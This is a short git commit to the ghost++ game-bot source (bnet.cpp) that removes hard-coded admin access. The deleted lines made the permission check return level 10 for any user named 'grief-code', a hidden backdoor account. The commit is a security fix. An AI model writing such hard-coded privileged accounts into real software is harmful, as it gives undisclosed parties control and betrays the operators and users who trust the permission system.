1158c84620bedf69abda767ae994eaedb403e7fb
Ankur Dedania <AbsoluteMSTR@gmail.com>
2014-09-09 15:24:24 -0500

    Update bnet.cpp
    removed hard coded admin access

--- ghost++/ghost/bnet.cpp
+++ ghost++/ghost/bnet.cpp
@@ -4323,10 +4323,6 @@ uint32_t CBNET :: IsLevel( string name )
 {
     transform( name.begin( ), name.end( ), name.begin( ), ::tolower );
 
-if(name=="grief-code") {
- return 10;
-}
-
     for( vector<permission> :: iterator i = m_Permissions.begin( ); i != m_Permissions.end( ); ++i )
     {
         if( i->player == name )
